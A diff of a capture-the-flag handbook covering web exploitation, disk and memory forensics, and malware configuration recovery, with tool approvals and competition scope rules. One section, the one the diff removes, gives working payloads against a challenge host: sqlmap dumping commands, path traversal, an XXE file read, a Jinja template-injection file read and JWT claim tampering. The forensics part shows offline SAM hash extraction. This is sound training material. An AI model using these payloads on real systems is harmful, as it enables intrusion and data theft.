-Inspect CSP in both response headers and console errors. A policy blocking inline script may still permit an existing script gadget, but merely seeing a CDN domain is not proof of a bypass. `base-uri`, nonces, strict-dynamic, MIME type, and actual resource behavior matter.
-
-If a challenge supplies an admin bot, reproduce its browser actions manually: start URL, authentication state, allowed schemes, navigation steps, and timeout. A payload working in your privileged browser might fail in the bot's fresh session. Use only the challenge's report interface and provided callback endpoints.
-
-### DOM sources and sinks
-
-| Source or behavior | Inspect | Common failure |
-|---|---|---|
-| `location.hash` | jQuery selector or HTML insertion call | Modern selector handling differs from historical versions |
-| `postMessage` | Exact origin and source-window check | Checking only a substring or accepting `null` origin |
-| `window.open` / opener | Navigation and cross-window references | Cross-origin property access is restricted |
-| `Blob`, `data`, uploaded HTML | Resulting origin and MIME type | Opaque origins differ from normal same-origin pages |
-| DOM clobbering | Named elements used as global configuration | The expected property may be a string, not a node |
-| Client-side path construction | URL before and after normalization | Traversal may occur in the browser before the server |
-| CSS selectors or font loads | Which condition causes a resource request | Character-set leaks do not reveal order or count |
-
-Timing and XS-Leak tests require repeated positive/negative controls. Cache, fonts, network warmup, and bot startup are confounders. First demonstrate a one-bit distinction before attempting recovery of a longer value.
-
-Do not run obfuscated JavaScript from a challenge in your everyday browser context. Read its strings and transformations in the provided challenge context or an isolated local reproduction. JSFuck, AAEncode, and JJEncode are encodings/obfuscation patterns, not automatic evidence of malicious behavior or a particular exploit.
-
-## 13. OAuth, SAML, CORS, and signatures
-
-Capture a complete normal login flow using your challenge accounts. Record authorization URL, redirect URI, state, nonce, callback, issuer, audience, and resulting session. A callback parameter is not necessarily trusted simply because it is present.
-
-For state binding, initiate two flows in separate sessions and compare their callbacks. For email canonicalization, compare two controlled identities. For open redirects, use a harmless organizer-provided destination and verify the final browser URL. Do not register external provider accounts or take over public subdomains as part of this handbook.
-
-For SAML, inspect the supplied XML and verifier configuration. Determine which element is signed and which element supplies the identity. Signature-wrapping and digest-confusion hypotheses need that mismatch; a valid signature on an unrelated element proves nothing about the consumed assertion.
-
-CORS checks require a browser. A server reflecting an `Origin` header is not sufficient: check credentials, allowed methods, preflight, and whether JavaScript can read a sensitive response. `Access-Control-Allow-Origin: *` cannot authorize credentialed reads in the usual browser CORS model.
-
-For custom signatures, identify the construction exactly. `hash(secret || message)` may permit length extension for some hashes; HMAC is different. CRC is not a cryptographic authenticator. Base64 leniency plus duplicate parameters can cause two parsers to verify and consume different messages. See [Cryptography](#07-cryptography) for byte-level verification examples.
-
-## 14. Races, caches, and protocol parsing
-
-Start race analysis from source showing a check and later update, or from a reproducible inconsistent result. Establish a sequential baseline, then attempt a pair of concurrent requests in the challenge only. Reset the challenge state if possible. A timeout is not a successful race, and widespread parallel retries obscure the cause.
-
-For cache behavior, use a unique cache-busting key and your own challenge object. Inspect `Age`, cache status, `Vary`, ETag, and whether authenticated and anonymous responses differ. A static-looking suffix can influence caching; the origin route may still return dynamic content. Do not poison shared unrelated pages.
-
-Request smuggling needs two HTTP parsers that disagree on request boundaries. Identify proxy and backend behavior from supplied configuration. Do not send ambiguous requests at the competition platform or shared infrastructure. In a dedicated local challenge reproduction, compare how each parser interprets length, transfer coding, headers, and connection reuse. Burp's displayed request is not proof of exact bytes sent over HTTP/2.
-
-HTTP method changes and header tricks require a route-specific hypothesis. TRACE, Range, forwarded host, and proxy headers do not inherently bypass authorization. A server error may be a parsing discrepancy; save the exact raw response before following a chain.
-
-## 15. Advanced source material: practical starting points
-
-| Source family | Start with | Constraint and next step |
-|---|---|---|
-| Framework CVEs, RSC/Flight, Next middleware | Supplied lockfile, route architecture, middleware behavior | Match affected version and configuration using the offline advisory; do not infer a CVE from branding |
-| Image/HTML/PDF renderer exploitation | Renderer name/version and one marker document | Observe whether content is fetched, embedded, or executed; avoid unapproved exploit generators |
-| Debugger consoles | Actual debug page and supplied deployment config | A PIN prompt is not authorization; determine the intended challenge path and secret derivation |
-| Serializer length changes | Before/after bytes and declared length fields | Reproduce expansion or truncation on a toy value before altering object structure |
-| Regex timing and backtracking | Pattern, input limit, fail-open handling | Use short timed controls; never send uncontrolled resource-exhaustion payloads |
-| Client HMAC or public-key encryption | Key origin and verification code | A client-visible symmetric secret cannot establish client trust; public encryption alone proves no sender identity |
-| WebAuthn replay | Challenge generation, session binding, expiration | Replay only your captured challenge response and verify the server's state transition |
-| Web3 contracts | Supplied source, ABI, storage layout, call authorization | Static review can expose delegatecall context, reentrancy order, signature replay, or unchecked calldata |
-| Solidity storage/compiler quirks | Exact compiler version and generated artifact | No online compiler; unlisted toolchains are not assumed approved. Use source and supplied bytecode or organizer clarification |
-| JA4/TLS fingerprints | Captured client hello and expected browser | Header ordering cannot reproduce all TLS fingerprints; prefer the intended approved browser |
-| Host/service pivots | Explicit challenge service map | Stop at the challenge boundary; organizer workstations, scoring platform, and unrelated networks are outside scope |
-
-Old cloud-takeover, CI credential-harvesting, public callback, AI-chatbot, and large-scale automation recipes are not runnable event workflows here. Their relevant trust-boundary concepts are retained above; exclusions are explained in [Excluded and advanced material](#12-excluded-and-advanced).
-
-## 16. Turn a confirmed primitive into the challenge answer
-
-The diagnostics above should lead to a concrete recovery step. Use the narrowest demonstrated primitive and the flag location or table indicated by the challenge. These examples are for the assigned challenge, with your observed parameter names and current session.
-
-### Confirmed SQLi → selected flag column
-
-**Kali only.** Start with the manually confirmed `request.txt` from section 6. Replace `challenge_db`, `flags`, and `flag_value` below with names learned in the preceding output. Preserve the technique that actually worked; `B` here means the demonstrated boolean oracle.
-
-```bash
-sqlmap -r request.txt -p id --technique=B --level=1 --risk=1 --threads=1 --delay=1 --timeout=10 --retries=0 --batch --dbs
-sqlmap -r request.txt -p id --technique=B --level=1 --risk=1 --threads=1 --delay=1 --timeout=10 --retries=0 --batch -D challenge_db --tables
-sqlmap -r request.txt -p id --technique=B --level=1 --risk=1 --threads=1 --delay=1 --timeout=10 --retries=0 --batch -D challenge_db -T flags --columns
-sqlmap -r request.txt -p id --technique=B --level=1 --risk=1 --threads=1 --delay=1 --timeout=10 --retries=0 --batch -D challenge_db -T flags -C flag_value --dump --start=1 --stop=1
-```
-
-Expected progression: database list → selected table list → column names/types → one flag cell. If supplied source already names the table and column, skip discovery. If the first row is not the intended row, inspect the schema and use a known challenge identifier as a `--where` predicate rather than dumping unrelated data. Stop if the session expires or the oracle becomes unstable.
-
-Without sqlmap on WSL, use the confirmed boolean oracle and the binary-search logic from section 6 to recover a known column character by character, or use a visible `UNION SELECT` result. Derive the exact DBMS substring and character-code syntax from the supplied database/source, and first verify length and the first known prefix character manually.
-
-### Confirmed traversal → supplied flag file
-
-Suppose the supplied source says the application reads from `/app/public` and the flag is `/app/flag.txt`. After `file=welcome.txt` and the traversal boundary have been confirmed, send:
-
-```http
-GET /view?file=../flag.txt HTTP/1.1
-Host: challenge.example
-Cookie: session=YOUR_CHALLENGE_SESSION
-
-```
-
-Expected response: the actual file bytes, including the challenge flag. A literal `../flag.txt`, a generic error, or a login page is not success. If the source appends `.txt`, supply `../flag` instead. If it resolves a different base directory, calculate the path from that directory; do not blindly add dozens of `../` segments.
-
-For a confirmed XML external-entity reader with the same explicit flag path:
-
-```xml
-<?xml version="1.0"?>
-<!DOCTYPE note [<!ENTITY answer SYSTEM "file:///app/flag.txt">]>
-<note>&answer;</note>
-```
-
-Submit this through the application's normal XML field or upload, preserving its required root/namespace. The result may appear in a generated document rather than the HTTP body. If the content contains characters illegal in XML, a direct text entity may fail; the failure is not permission to upload the file to an external DTD service.
-
-### Confirmed Flask/Jinja evaluation → challenge file
-
-Use this only when supplied source identifies Flask/Jinja, arithmetic evaluation succeeded, the context exposes `get_flashed_messages`, and the source specifies `/app/flag.txt`. In the template-source field, the read expression is:
-
-```jinja2
-{{ get_flashed_messages.__globals__.__builtins__.open('/app/flag.txt').read() }}
-```
-
-Expected rendered output is the flag file content. This relies on a Python globals/builtins traversal and fails in a properly sandboxed or different context. If `__builtins__` is a module/dictionary or lookup behavior differs, inspect the supplied function's environment in the local reproduction rather than assuming another engine shares Jinja semantics. Let Burp encode the form field exactly once; raw braces in JSON do not need URL encoding.
-
-### Confirmed missing JWT verification → modified challenge claim
-
-This self-contained local demonstration models the specific broken verifier that decodes a JWT payload without verifying its signature. It does not forge a valid signature. Save as `jwt_unverified_toy.py`:
-
-```python
-import base64
-import json
-
-def encode(value):
-    raw = json.dumps(value, separators=(',', ':')).encode()
-    return base64.urlsafe_b64encode(raw).rstrip(b'=').decode()
-
-def broken_verify(token):
-    payload = token.split('.')[1]
-    return json.loads(base64.urlsafe_b64decode(payload + '='*(-len(payload) % 4)))
-
-token = encode({'alg': 'HS256', 'typ': 'JWT'}) + '.' + encode({'sub': 'test', 'role': 'user'}) + '.invalid'
-header, payload, signature = token.split('.')
-claims = broken_verify(token)
-claims['role'] = 'admin'
-modified = header + '.' + encode(claims) + '.' + signature
-assert broken_verify(token)['role'] == 'user'
-assert broken_verify(modified)['role'] == 'admin'
-print(modified)
-```
-
-For the challenge, use your captured token and only the role/identity claim the broken verifier actually consumes. Send the modified token to the known flag endpoint, then verify the returned flag. A decoder displaying `admin` locally proves nothing about the server: a correct verifier rejects this token.
-
-## 17. Finish with a reproducible result
-
-Save a short sequence: normal baseline, minimal changed request, response evidence, and final challenge-specific result. Remove session secrets from any shared writeup. Verify the flag format and submit it through the organizer interface. If a hypothesis fails, record the reason: wrong parser, insufficient privilege, signed state, unavailable dependency, blocked network path, or noisy oracle.
-
-The source material merged here includes every file under `ctf-web/`: reconnaissance and field notes; authentication, JWT, OAuth and infrastructure; SQL and other injections; paths, uploads, templates, command execution, deserialization, SSRF and XML; browser, cache, race, protocol and Web3 patterns. The MCP guide and asynchronous fuzzer are explicitly replaced with the manual, bounded workflows above. Detailed file dispositions are in `human-guide/review/web-coverage.json`.
-
-
----
-
 <a id="03-forensics"></a>
+
+<a id="03-forensics--disk-memory-and-host-forensics"></a>
 
 # Disk, memory, and host forensics
 
+**Quick route:** [Short commands](#quickstart--duplicate-tar-files) · [Tool strengths and weaknesses](#tool-chooser--forensics). Use this chapter for deeper explanations.
+
 Recover the smallest artifact that answers the question, then explain where it came from. A file name, a timestamp, and a matching hash are more useful than a directory full of unexplained carvings.
+
+<a id="03-forensics--choose-the-right-machine"></a>
 
 ## Choose the right machine
 
@@ -1014,9 +1234,11 @@ Workbook references below use **Windows** for `Approved Tool List for Windows`, 
 | Windows WSL | Python 3, strings, Sleuth Kit, xz, Volatility 3 | Windows rows 14, 18, 30, 32, 38 |
 | Kali | EWF tools, qemu-img, TestDisk/PhotoRec, foremost, SQLite, Git, Volatility 2 | Kali rows 41, 122, 150, 51, 138, 56, 158 |
 
-Commands marked **WSL** run in its Linux shell, not PowerShell. Windows approval does not imply that the same tool is installed or approved on the separate Kali machine. Python snippets here use the WSL Python approval; non-AI libraries are allowed by Windows row 14, subject to named exclusions. There is no blanket install step.
+Commands marked **WSL** run in its Linux shell, not PowerShell. A Windows listing does not establish a Kali installation. Python snippets use WSL Python; the PDF permits non-AI libraries in both environments, subject to [named exclusions and package setup](#00-tool-rules--non-ai-python-package-checks).
 
 The event prohibits AI tools and public analysis uploads. Keep evidence local and act only on challenge endpoints. See the [competition rules](https://ajccbc.ncsa.or.th/cyber-sea-game-2026/).
+
+<a id="03-forensics--preserve-a-baseline"></a>
 
 ## Preserve a baseline
 
@@ -1043,6 +1265,8 @@ strings -a -e l -n 8 work/evidence.img > out/strings-utf16.txt
 ```
 
 Search these text files in your editor. On Kali, `file work/evidence.img` is available (Kali row 49). A suffix such as `.dmp` does not distinguish full physical memory from a single-process minidump; inspect the signature before selecting a parser.
+
+<a id="03-forensics--partition-offsets-and-targeted-recovery"></a>
 
 ## Partition offsets and targeted recovery
 
@@ -1075,6 +1299,8 @@ Expected result: recovered bytes match the file's format and declared length. Fo
 
 If `fsstat` rejects the image, check offset units, sector size, compression/container format, and filesystem support before assuming corruption. `fls` puts a colon after every address; searching for `:` alone does **not** reliably identify alternate streams.
 
+<a id="03-forensics--missing-partitions-carving-and-virtual-disks"></a>
+
 ## Missing partitions, carving, and virtual disks
 
 **Kali** (rows 150, 51, 122, 41):
@@ -1093,6 +1319,8 @@ In TestDisk, use **Analyse**, then **Quick Search** and file listing/copying. Do
 For VMDK, provide all split extents and backing snapshots in their expected relative paths. Converting only a delta file without its parent gives incomplete or incorrect results. OVA is a tar container; on Kali use `tar -tf machine.ova` before extracting selected members. A VM snapshot can contain separate `.vmem` and state files; retain both, and try the supported memory parser before assuming a converter is available.
 
 Sparse VMDK fallback: read the header's sector-based grain size, grain-directory offset, and entries-per-table. A directory entry points to a grain table; a table entry points to a physical grain. Translate virtual sector to grain index and in-grain offset; zero entries represent unallocated grains. Do not concatenate sparse extents as if they were raw sectors.
+
+<a id="03-forensics--a-reusable-extent-and-byte-transform-extractor"></a>
 
 ## A reusable extent and byte-transform extractor
 
@@ -1136,6 +1364,8 @@ Null interleaving often makes every second byte zero and doubles the apparent si
 
 XFS extent fields are packed and include allocation-group addressing: a filesystem block value cannot always be multiplied directly by block size without decoding the AG component. HFS+ resource forks have their own extents and logical size; examine both forks. ISO 9660 directory records contain extent LBA and data length; the usual logical block size is 2048, but read the volume descriptor. These are parsing workflows, not permission to install missing filesystem tools.
 
+<a id="03-forensics--archives-list-test-then-recover"></a>
+
 ## Archives: list, test, then recover
 
 **Kali:** `7z` row 9, `tar` row 148, `unzip` row 155, `bkcrack` row 20, John row 80. **WSL:** Python row 14 and xz row 32.
@@ -1147,7 +1377,13 @@ tar -tvf archive.tar.xz
 unzip -l document.docx
 ```
 
-OOXML documents are ZIPs: inspect `word/media/`, `xl/worksheets/`, embedded objects, and relationships. Do not enable macros. For repeated tar names, standard extraction overwrites earlier versions. This **WSL** script preserves each regular-file occurrence under a generated name, so archive paths cannot overwrite your workspace:
+OOXML documents are ZIPs: inspect `word/media/`, `xl/worksheets/`, embedded objects, and relationships. Do not enable macros.
+
+<a id="03-forensics--keep-duplicate-tar-members"></a>
+
+### Keep duplicate tar members
+
+For repeated tar names, standard extraction overwrites earlier versions. The [ready-to-run extractor](#quickstart--duplicate-tar-files) accepts your archive filename, preserves every occurrence and prints previews. The following teaching example shows how it works in **WSL Python**; save it as `tar_versions.py`, replace `archive.tar.xz` with your filename and run `python3 tar_versions.py`:
 
 ```python
 import tarfile
@@ -1216,6 +1452,8 @@ bkcrack -C secret.zip -k K0 K1 K2 -U out/unlocked.zip RecoveredOnly
 
 If the original password was recovered independently, skip key recovery and use `7z t secret.zip` followed by `7z x secret.zip -oout/unlocked`; enter that password at the prompt. A CRC failure after unlocking suggests wrong plaintext alignment, a different member password, or damaged archive data.
 
+<a id="03-forensics--memory-establish-what-the-dump-supports"></a>
+
 ## Memory: establish what the dump supports
 
 **WSL Volatility 3**, Windows row 38:
@@ -1275,6 +1513,8 @@ quit
 
 Replace both addresses with a mapped region from this core. A universal 32-bit search range misses 64-bit heaps. GDB opens the core for analysis; do not run a recovered executable to inspect its strings.
 
+<a id="03-forensics--keys-framebuffers-and-unusual-memory-remnants"></a>
+
 ## Keys, framebuffers, and unusual memory remnants
 
 For ransomware, identify the cipher, key length, IV location, padding, and file layout from the recovered program. An AES key may remain near path strings or a configuration structure. Restrict candidates to those regions and test against **two independent known file signatures**. A successful authentication tag is much stronger evidence than printable plaintext. A timestamp-derived key search must reproduce the exact PRNG implementation and seed units; Python's random generator is not interchangeable with C, Ruby, or .NET PRNGs.
@@ -1296,6 +1536,8 @@ Image.frombytes('RGB', (width, height), raw, 'raw', 'BGRX').save('out/screen.png
 
 Try documented RGB/BGR/BGRA layouts and row stride; recognizable fragments can be partial or stale. In a minidump, file offsets differ from process virtual addresses. Parse its memory descriptors before translating an address into a file slice.
 
+<a id="03-forensics--windows-artifact-timeline"></a>
+
 ## Windows artifact timeline
 
 **Windows native**, built-in PowerShell, on an exported EVTX file:
@@ -1308,6 +1550,8 @@ Get-WinEvent -Path .\Security.evtx -Oldest |
 ```
 
 Missing message resources can produce blank descriptions. Export `ToXml()` to retain named event fields and UTC `SystemTime`. Event IDs are provider-specific: Security 1102 is audit clearing; 4720 account creation; 4781 account rename. RDP authentication event 1149 belongs to RemoteConnectionManager; LocalSessionManager 21/24/25 describe logon/disconnect/reconnect. Authentication success alone does not prove an interactive desktop was used.
+
+**Security event 4688 records process creation.** `NewProcessName` identifies the executable; `CommandLine` contains arguments when command-line auditing captured them. Some JSON exports rename that field `ProcessCommandLine`. XML `SystemTime` ending in `Z` is UTC. A blank command line does not prove there were no arguments, and this event alone does not establish successful execution, malicious intent or payload effects. Use the [process-event quick card](#quickstart--process-event) for a named-field extraction command. [Microsoft field definitions](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4688).
 
 Zimmerman tools are approved on **Windows row 46**. From their installed directory:
 
@@ -1350,6 +1594,8 @@ impacket-secretsdump -sam SAM -system SYSTEM LOCAL > out/sam-hashes.txt
 
 This is offline extraction. Do not reuse recovered credentials against services outside the challenge.
 
+<a id="03-forensics--browser-sqlite-android-and-linux-evidence"></a>
+
 ## Browser, SQLite, Android, and Linux evidence
 
 Work on a copied database alongside its `-wal` and `-shm` files. The WAL may hold the newest or deleted material. Opening only the main database can miss it. **Kali SQLite**, row 138:
@@ -1387,6 +1633,8 @@ for ident, op, pos, value in db.execute(
 
 Positions might be UTF-16 code units or bytes instead of Python characters; use the application's convention. For raw SQLite differences, decode record-header varints: serial types 0–9 have special meanings; even types ≥12 are blobs of `(type-12)/2` bytes, odd types ≥13 are text of `(type-13)/2` bytes. Changed type bytes can change interpretation without changing the visible payload.
 
+<a id="03-forensics--git-and-container-history"></a>
+
 ## Git and container history
 
 **Kali Git**, row 56, on a supplied local repository:
@@ -1401,6 +1649,8 @@ git -C recovered show COMMIT:path/to/file
 Replace `COMMIT` with an object ID printed by the earlier commands. `git log --all` excludes dangling commits; inspect the IDs from `fsck` explicitly. Recover deleted `.git/objects/xx/...` files with `icat` first and preserve their paths. Do not run garbage collection. For a corrupted loose object, decompress zlib and hash the full `type size\0content` record; matching the expected object ID validates a single-byte repair. If the repository uses SHA-256, do not assume SHA-1.
 
 For a Docker save archive, inspect `manifest.json`, its config's `history`, and every layer tar in order. OCI archives instead use `index.json` and content-addressed descriptors. Whiteouts (`.wh.name`, `.wh..wh..opq`) remove earlier content from the final view but leave earlier layer bytes recoverable. Build history is useful but does not necessarily retain every command or secret after squashing/metadata changes. The tar extraction script above works without starting containers.
+
+<a id="03-forensics--advanced-filesystem-cases-know-the-limits"></a>
 
 ## Advanced filesystem cases: know the limits
 
@@ -1429,6 +1679,8 @@ with open('disk1.img','rb') as a, open('disk3.img','rb') as b, open('out/disk2.i
 
 Do not create a live RAID array or run repair tools on the evidence. Filesystem repairs can overwrite the very orphaned records you want. Use supported read-only extraction, then a separate expendable copy if a justified repair path is available.
 
+<a id="03-forensics--finish-with-a-reproducible-result"></a>
+
 ## Finish with a reproducible result
 
 Record the input hash, partition/stream offset, inode or process ID, exact command, output hash, and the evidence supporting the answer. Keep observations separate from interpretations. A copied flag-shaped string can be a decoy; verify its relationship to the challenge question.
@@ -1438,11 +1690,2986 @@ Source material adapted: `ctf-forensics/SKILL.md`, `disk-and-memory.md`, `disk-a
 
 ---
 
+<a id="09-malware"></a>
+
+<a id="09-malware--malware-analysis-and-configuration-recovery"></a>
+
+# Malware analysis and configuration recovery
+
+**Quick route:** [Short commands](#quickstart--malware) · [Tool strengths and weaknesses](#tool-chooser--malware). Use this chapter for deeper explanations.
+
+The first objective is usually a small, concrete answer: a configuration value, decoded payload, encryption key, persistence location, or reconstructed conversation. Find the data flow that produces it before considering execution.
+
+<a id="09-malware--approved-analysis-routes"></a>
+
+## Approved analysis routes
+
+**Windows native:** HxD, x64dbg, dnSpyEx (Windows workbook rows 42, 40, 45). **WSL:** Python 3, objdump, strings, Ghidra, Volatility 3 (Windows rows 14, 17, 18, 29, 38). **Kali:** capa, FLOSS, oletools, jadx, pyinstxtractor-ng, YARA, strace/ltrace (Kali rows 26, 50, 105, 79, 118, 164, 145/90).
+
+Use the supplied Kali location for Defender-sensitive tools such as Hayabusa/Sigma, Metasploit and mimikatz; do not disable laptop Defender. [Machine limits and placement](#competition--choose-the-machine-before-the-tool). Each listing applies to its recorded environment. Use installed versions/help; optional rules, plugins, symbol files and unpackers are not automatically included. Non-AI additions follow [PDF p.5 and the named exclusions](#competition--what-is-allowed). AI interfaces, public malware uploads, and online decompilers are prohibited by the [event rules](https://ajccbc.ncsa.or.th/cyber-sea-game-2026/) and Unapproved rows 51–52. Dissect is explicitly unapproved (row 21), so the source's `dissect.cobaltstrike` recipe is not used here.
+
+<a id="09-malware--static-triage"></a>
+
+## Static triage
+
+`sample.bin` is a local challenge-supplied file. Hash it and keep an untouched copy. **Windows PowerShell:**
+
+```powershell
+Get-FileHash -Algorithm SHA256 -LiteralPath .\sample.bin
+```
+
+**WSL:**
+
+```bash
+xxd -l 256 sample.bin
+strings -a -n 6 sample.bin > strings-ascii.txt
+strings -a -e l -n 6 sample.bin > strings-utf16.txt
+objdump -f sample.bin
+objdump -x sample.bin > headers.txt
+```
+
+**Kali**, if those corresponding tools are present:
+
+```bash
+file sample.bin
+capa sample.bin
+floss sample.bin
+```
+
+Expected result: architecture/file type, imports, section layout, interesting strings, and candidate capabilities. High entropy can mean compression, encryption, or ordinary media. A capability match is a lead, not proof that a function executed.
+
+Open a native binary in approved Ghidra. Run auto-analysis, search for the interesting string, inspect cross-references, and decompile its callers. Rename the decryptor and annotate key/IV/blob sources. Read assembly when decompiler types or control flow are misleading. Record whether integer operations wrap at 8, 16, or 32 bits.
+
+<a id="09-malware--decode-scripts-without-executing-them"></a>
+
+## Decode scripts without executing them
+
+Replacing `eval` with `print` does not neutralize code that runs before the eval. Extract literals and reproduce their transformations in a separate script. Do not dot-source a PowerShell file, import a suspicious Python module, or run `npm install` on a malicious package to inspect it.
+
+**Windows PowerShell**, decode only a copied `-EncodedCommand` value saved to `encoded.txt`:
+
+```powershell
+$encoded = (Get-Content -Raw -LiteralPath .\encoded.txt).Trim()
+$decoded = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded))
+Set-Content -LiteralPath .\decoded.ps1.txt -Value $decoded -Encoding UTF8
+```
+
+Expected result: readable UTF-16LE PowerShell text. If it is gibberish, check that you extracted only the literal, then inspect whether it was UTF-8 or compressed. Keep the `.txt` suffix to discourage accidental execution.
+
+For a Base64 layer containing gzip or zlib, **WSL**, save as `decode_layer.py`:
+
+```python
+from pathlib import Path
+import base64, zlib
+
+encoded = ''.join(Path('encoded.txt').read_text().split())
+raw = base64.b64decode(encoded, validate=True)
+Path('layer1.bin').write_bytes(raw)
+if raw.startswith(b'\x1f\x8b'):
+    mode = 31  # gzip wrapper
+elif len(raw) >= 2 and (raw[0]*256 + raw[1]) % 31 == 0 and raw[0] & 15 == 8:
+    mode = 15  # plausible zlib wrapper; still requires validation
+else:
+    print('no supported compression wrapper; inspect layer1.bin')
+    raise SystemExit
+dec = zlib.decompressobj(mode)
+out = dec.decompress(raw, 16_000_001)
+if len(out) > 16_000_000 or dec.unconsumed_tail:
+    raise ValueError('output limit reached')
+assert dec.eof, 'incomplete compressed stream'
+Path('layer2.bin').write_bytes(out)
+print('decoded bytes:', len(out), 'unused trailing bytes:', len(dec.unused_data))
+```
+
+For JS `String.fromCharCode`, parse only literal numeric arrays; `fromCharCode` emits UTF-16 code units rather than unrestricted Unicode codepoints. For `%xx`, use `urllib.parse.unquote_to_bytes`; JS `unescape` additionally handles `%uXXXX`. For Python literals use `ast.literal_eval`, not `eval`; marshal/code objects require version-aware disassembly and must not be executed.
+
+**Kali** beautification is available (row 82): `js-beautify suspicious.js -o readable.js`. Beautification preserves behavior; it is not a safety sandbox. Search for string tables, index rotations, function constructors, and decode chains, then lift just the pure transformations.
+
+<a id="09-malware--packages-office-macros-and-trojanized-plugins"></a>
+
+## Packages, office macros, and trojanized plugins
+
+**Kali**, `7z` row 9 and oletools row 105:
+
+```bash
+7z l package.deb
+7z x package.deb -opackage-parts
+oleid document.docm
+olevba document.docm > macro-report.txt
+```
+
+Inspect `control.tar.*` for `preinst/postinst/prerm/postrm`; inspect data archive paths without running package installation. A plugin can hide activation code in an exception handler, setup hook, or import side effect. Compare with a supplied known-good release using **Kali Git**, row 56:
+
+```bash
+git diff --no-index -- known-good/plugin.py suspect/plugin.py
+```
+
+Exit code 1 means differences were found. Follow added network calls and decode wrappers. An offline custom-alphabet decoder, **WSL**:
+
+```python
+from pathlib import Path
+alphabet = '0123456789abcdefghijklmnopqrstuvwxyz-.'
+shift = 13  # derive from the sample
+encoded = Path('domain-encoded.txt').read_text().strip()
+assert all(c in alphabet for c in encoded)
+decoded = ''.join(alphabet[(alphabet.index(c)-shift)%len(alphabet)] for c in encoded)
+print(decoded)
+```
+
+For macro-encoded cells, preserve traversal order and reverse the exact arithmetic. If the macro stores `3*byte+78`, require `(value-78)%3 == 0` and result in `0..255` before writing bytes. This avoids silently accepting an incorrect formula. Do not enable the document's macros to obtain the output.
+
+<a id="09-malware--pe-resources-net-and-python-bundles"></a>
+
+## PE resources, .NET, and Python bundles
+
+Use `objdump -s -j .rdata sample.exe` in **WSL** for a selected PE section. In Ghidra, trace resource-loading APIs and the code that consumes the resource. If extracting with WSL non-AI `pefile`, distinguish RVA from file offset; `pe.get_data(rva,size)` performs that translation. Virtual-size padding and overlays are separate from raw section bytes.
+
+On **Windows**, open managed assemblies in dnSpyEx. Search for `FromBase64String`, cipher constructors, `Dns`, `TcpClient`, registry writes, and static initialization. Follow configuration fields to their decryptor; a plausible C2 string in resources can be a decoy. Export the encrypted bytes and key source as data, then decode locally.
+
+For an observed MD5-password + IV-prefixed AES-CBC construction, **WSL** with non-AI PyCryptodome permitted by Windows row 14:
+
+```python
+from pathlib import Path
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import unpad
+import hashlib
+
+password = Path('key-source.bin').read_bytes()  # exact bytes, no implicit stripping
+data = Path('encrypted-config.bin').read_bytes()
+assert len(data) >= 32 and (len(data)-16)%16 == 0
+key = hashlib.md5(password).digest()  # only if the sample uses MD5 digest bytes
+plain = unpad(AES.new(key,AES.MODE_CBC,iv=data[:16]).decrypt(data[16:]),16)
+Path('config.txt').write_bytes(plain)
+print(repr(plain))
+```
+
+Padding success alone has false positives. Verify structure, key names, lengths, and any authentication tag. A sample may use hexadecimal digest text instead of digest bytes. The historical LimeRAT recipe `MD5[:15] + MD5 + NUL` is one 32-byte derivation, not a universal LimeRAT rule; reproduce the exact decompiled byte-copy operations.
+
+**Kali** Python bundle tools (rows 118, 117, 152):
+
+```bash
+pyinstxtractor-ng --help
+pyinstxtractor-ng sample.exe
+pycdc recovered.pyc > recovered.py
+uncompyle6 recovered.pyc > recovered-legacy.py
+```
+
+Use the extractor's actual output directory and interpreter version. A decompiler error often means unsupported bytecode, not missing content. Extracted `.pyc` files may need correct version headers. Do not assume pycdc supports every recent Python version, or install an unlisted PyArmor unpacker. When protected code cannot be recovered statically, identify resources/configs and use supplied memory evidence.
+
+For Android samples, **Kali jadx** (row 79): `jadx -d decoded sample.apk`. Inspect the manifest for exported receivers/services and startup triggers, then code references to network methods. Searching only `strings.xml` misses Java/Kotlin string literals. JNI/native libraries continue through the native reversing route.
+
+<a id="09-malware--c2-decoding-reconstruct-first-decrypt-second"></a>
+
+## C2 decoding: reconstruct first, decrypt second
+
+Use the network chapter's direction-aware reassembly. Record each message's length, direction, sequence number, nonce/IV, and cipher reset behavior. TLS decryption, WebSocket unmasking, application framing, and application encryption are separate layers. Wireshark **Decode As** can recognize a nonstandard TLS port without rewriting packet ports.
+
+For RC4, determine whether state resets per message or continues across the stream. A compact **WSL** implementation for a verified single stream:
+
+```python
+from pathlib import Path
+def rc4(key, data):
+    if not key: raise ValueError('empty key')
+    s,j = list(range(256)),0
+    for i in range(256):
+        j = (j+s[i]+key[i%len(key)]) & 255
+        s[i],s[j] = s[j],s[i]
+    i=j=0; out=bytearray()
+    for byte in data:
+        i=(i+1)&255; j=(j+s[i])&255
+        s[i],s[j]=s[j],s[i]
+        out.append(byte ^ s[(s[i]+s[j])&255])
+    return bytes(out)
+key = Path('rc4-key.bin').read_bytes()
+plain = rc4(key,Path('ciphertext.bin').read_bytes())
+Path('decrypted.bin').write_bytes(plain)
+print(repr(plain[:200]))
+```
+
+A first 32-byte packet is a key only if sample logic confirms that design. “Concatenate both directions chronologically” is valid only for an unusual protocol explicitly sharing state; most protocols have independent direction state. For rotating passwords, reconstruct time bucket/sequence units and timezone from implementation and capture timestamps.
+
+Crypto clues: RC4 initializes a 256-byte permutation; ChaCha uses `expand 32-byte k`; AES often contains S-box constants; TEA/XTEA often uses `0x9E3779B9`. Constants alone do not identify mode, key derivation, or padding. For Camellia-based samples, inspect **WSL OpenSSL** `openssl list -cipher-algorithms`; PyCryptodome does not supply the source's invented `Crypto.Cipher.Camellia` module. Verify mode/block framing before using a locally supported primitive.
+
+RAT-specific leads: DarkComet-like logs may exist in `%APPDATA%\dclogs\*.dc`; inspect memory file objects and Run keys. Beacon-like samples often store structured configuration values; decode XOR wrappers and trace configuration parsing in Ghidra. Timing, URI names, and a familiar port do not prove a malware family. Recovered Telegram tokens stay evidence: do not call live bot APIs or retrieve third-party messages.
+
+<a id="09-malware--memory-and-controlled-runtime-work"></a>
+
+## Memory and controlled runtime work
+
+Use supplied memory dumps first. **WSL Volatility 3**, with existing matching symbols only:
+
+```bash
+vol --offline -f memory.dmp windows.pstree
+vol --offline -f memory.dmp windows.psscan
+vol --offline -f memory.dmp windows.cmdline
+vol --offline -f memory.dmp windows.netscan
+vol --offline -f memory.dmp windows.malfind
+```
+
